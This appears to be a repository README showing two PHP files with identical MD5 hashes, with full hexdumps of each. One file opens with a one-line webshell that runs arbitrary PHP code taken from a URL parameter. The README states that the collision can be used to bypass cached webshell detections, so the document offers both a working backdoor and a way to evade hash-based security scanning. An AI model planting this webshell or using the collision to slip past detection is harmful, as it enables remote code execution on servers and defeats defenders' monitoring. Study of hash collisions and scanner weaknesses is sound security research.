# Webshell Collision

This repository contains 2 files that have the same MD5 hash:

- [webshell.php](webshell.php)
- [normal.php](normal.php)

MD5 for the files:

```
$ md5sum *.php
b719a17ae091ed45fb874c15b2d9663f  normal.php
b719a17ae091ed45fb874c15b2d9663f  webshell.php
```

Hexdump for the `webshell.php`:

```
$ hexdump -C webshell.php
00000000  3c 3f 3d 65 76 61 6c 28  24 5f 47 45 54 5b 31 5d  |<?=eval($_GET[1]|
00000010  29 3b 3f 3e 3d 62 84 11  01 75 d3 4d eb 80 93 de  |);?>=b...u.M....|
00000020  31 c1 d9 30 45 fb be 1e  71 f0 0a 63 75 a8 30 aa  |1..0E...q..cu.0.|
00000030  98 17 ca e3 00 00 00 00  bf 99 ad 4b 58 bc fc 4c  |...........KX..L|
00000040  5c ac 31 42 33 35 c4 16  05 46 c3 93 ae 3e f4 a3  |\.1B35...F...>..|
00000050  4f 8e 33 76 8c 22 19 8b  b0 31 fd ed 34 3c 56 68  |O.3v."...1..4<Vh|
00000060  08 4a 5b 47 10 ca 8d 46  ac 26 29 5f d2 bd f3 dd  |.J[G...F.&)_....|
00000070  0d b2 ac cd 3f 71 d8 a5  53 23 cb bf cf 1d 37 de  |....?q..S#....7.|
00000080  c7 50 86 48 b8 5c 6c 57  2f 49 4e 35 1e 2d 5b 31  |.P.H.\lW/IN5.-[1|
00000090  4f e1 94 68 0f 3e e9 79  b2 84 54 62 88 29 3b 09  |O..h.>.y..Tb.);.|
000000a0  67 0c 25 64 2c 6e 49 1e  1e 42 f2 9c 37 e4 34 f9  |g.%d,nI..B..7.4.|
000000b0  f6 10 cd aa 72 ec 2e 42  6a 69 5f 14 b7 b9 27 9b  |....r..Bji_...'.|
000000c0  ce fa 2c a7 7b 03 70 5b  c0 7a 43 dd 54 a0 42 cc  |..,.{.p[.zC.T.B.|
000000d0  d7 1f 89 cb db a5 eb c0  14 ba 02 d6 99 2d 28 94  |.............-(.|
000000e0  15 c4 bf 66 9d bd 69 ed  0a 27 73 a8 78 9b 83 52  |...f..i..'s.x..R|
000000f0  ea b4 4c 8d f8 7a 81 e4  5f 3b 5a f6 b8 5d 05 a0  |..L..z.._;Z..]..|
00000100  60 9f 1a 39 6a 66 bf 69  0e 38 7e 1e 0b 62 d5 2c  |`..9jf.i.8~..b.,|
00000110  ac 04 2d 0d 6d ae 27 f0  4e c7 1b 91 80 e0 fe 35  |..-.m.'.N......5|
00000120  2e 38 58 67 e3 50 6e 56  61 27 6b e8 eb 04 67 4b  |.8Xg.PnVa'k...gK|
00000130  1f 1d b7 a7 71 6b 01 18  4b d8 f8 a3 30 16 69 4f  |....qk..K...0.iO|
00000140  c7 db 95 06 0c f3 45 52  92 7e 8f f7 22 36 4f 6c  |......ER.~.."6Ol|
00000150  24 a9 14 1f f4 f2 5c 09  41 50 58 3e 75 7c b2 d6  |$.....\.APX>u|..|
00000160  bf 45 67 6a ef 18 b2 94  ac 52 50 a7 38 fa fc 52  |.Egj.....RP.8..R|
00000170  f7 36 db b4 98 31 a0 e5  43 4f 6d 3f c9 29 64 86  |.6...1..COm?.)d.|
00000180  a3 98 f9 64 9d d3 2e 1c  b2 d2 f9 35 9d 80 56 8b  |...d.......5..V.|
00000190  69 2f 9f d6 a7 83 dd 20  90 1c 31 4f 14 a6 20 20  |i/..... ..1O..  |
000001a0  21 8f 5f 6b 1e 2a 92 da  2e 4c 0a 0e 17 a9 20 c0  |!._k.*...L.... .|
000001b0  7e 62 8f 73 9a 83 32 30  71 8d f0 e0 70 c9 85 de  |~b.s..20q...p...|
000001c0  c0 80 d6 8e f6 20 77 4b  5d 9f 14 49 3d 3f aa c5  |..... wK]..I=?..|
000001d0  0c 42 92 42 9e 7f 21 43  32 ab 54 b2 33 21 c0 93  |.B.B..!C2.T.3!..|
000001e0  74 28 ed f9 25 85 60 e3  7e 32 b6 a4 4e 12 50 b7  |t(..%.`.~2..N.P.|
000001f0  0c d5 95 35 ae d7 ee 14  60 de 1f c9 cd 4b b8 ed  |...5....`....K..|
00000200
```

Hexdump for the `normal.php`:

```
$ hexdump -C normal.php
00000000  78 78 78 78 78 78 78 78  78 78 78 78 78 61 61 61  |xxxxxxxxxxxxxaaa|
00000010  61 61 61 61 97 25 a6 fb  17 28 1a d3 52 62 cb c7  |aaaa.%...(..Rb..|
00000020  55 d7 cd 86 e5 5f d0 83  01 9b 4d 55 06 61 ab 88  |U...._....MU.a..|
00000030  11 8a fa 4d 00 00 00 00  d9 73 ee ef 8a f6 75 2a  |...M.....s....u*|
00000040  5c ac 31 42 33 35 c4 16  05 46 c3 93 ae 3e f4 a3  |\.1B35...F...>..|
00000050  4f 8e 33 76 8c 22 19 8b  b0 31 fd ed 34 3c 56 68  |O.3v."...1..4<Vh|
00000060  08 4a 5b 47 10 ca 8d 46  ac 26 29 5f d2 c5 f3 dd  |.J[G...F.&)_....|
00000070  0d b2 ac cd 3f 71 d8 a5  53 23 cb bf cf 1d 37 de  |....?q..S#....7.|
00000080  c7 50 86 48 b8 5c 6c 57  2f 49 4e 35 1e 2d 5b 31  |.P.H.\lW/IN5.-[1|
00000090  4f e1 94 68 0f 3e e9 79  b2 84 54 62 88 29 3b 09  |O..h.>.y..Tb.);.|
000000a0  67 0c 25 64 2c 6e 49 1e  1e 42 f2 9c 37 c4 34 f9  |g.%d,nI..B..7.4.|
000000b0  f6 10 cd aa 72 ec 2e 42  6a 69 5f 14 b7 b9 27 9b  |....r..Bji_...'.|
000000c0  ce fa 2c a7 7b 03 70 5b  c0 7a 43 dd 54 a0 42 cc  |..,.{.p[.zC.T.B.|
000000d0  d7 1f 89 cb db a5 eb c0  14 ba 02 d6 99 2d 28 94  |.............-(.|
000000e0  15 c4 bf 66 9d bd 69 ed  0a 27 73 a8 7a 9b 83 52  |...f..i..'s.z..R|
000000f0  ea b4 4c 8d f8 7a 81 e4  5f 3b 5a f6 b8 5d 05 a0  |..L..z.._;Z..]..|
00000100  60 9f 1a 39 6a 66 bf 69  0e 38 7e 1e 0b 62 d5 2c  |`..9jf.i.8~..b.,|
00000110  ac 04 2d 0d 6d ae 27 f0  4e c7 1b 91 80 e0 fe 35  |..-.m.'.N......5|
00000120  2e 38 58 67 e3 50 6e 56  61 27 6b e8 6b 05 67 4b  |.8Xg.PnVa'k.k.gK|
00000130  1f 1d b7 a7 71 6b 01 18  4b d8 f8 a3 30 16 69 4f  |....qk..K...0.iO|
00000140  c7 db 95 06 0c f3 45 52  92 7e 8f f7 22 36 4f 6c  |......ER.~.."6Ol|
00000150  24 a9 14 1f f4 f2 5c 09  41 50 58 3e 75 7c b2 d6  |$.....\.APX>u|..|
00000160  bf 45 67 6a ef 18 b2 94  ac 52 50 a7 38 fa f8 52  |.Egj.....RP.8..R|
00000170  f7 36 db b4 98 31 a0 e5  43 4f 6d 3f c9 29 64 86  |.6...1..COm?.)d.|
00000180  a3 98 f9 64 9d d3 2e 1c  b2 d2 f9 35 9d 80 56 8b  |...d.......5..V.|
00000190  69 2f 9f d6 a7 83 dd 20  90 1c 31 4f 14 a6 20 20  |i/..... ..1O..  |
000001a0  21 8f 5f 6b 1e 2a 92 da  2e 4c 0a 0e 17 a9 20 be  |!._k.*...L.... .|
000001b0  7e 62 8f 73 9a 83 32 30  71 8d f0 e0 70 c9 85 de  |~b.s..20q...p...|
000001c0  c0 80 d6 8e f6 20 77 4b  5d 9f 14 49 3d 3f aa c5  |..... wK]..I=?..|
000001d0  0c 42 92 42 9e 7f 21 43  32 ab 54 b2 33 21 c0 93  |.B.B..!C2.T.3!..|
000001e0  74 28 ed f9 25 85 60 e3  7e 32 b6 a4 4e 12 30 b7  |t(..%.`.~2..N.0.|
000001f0  0c d5 95 35 ae d7 ee 14  60 de 1f c9 cd 4b b8 ed  |...5....`....K..|
00000200
```

Can use it bypass some cached webshell detections.

References:

- <https://t.zsxq.com/vbuvbAY> (In Chinese)
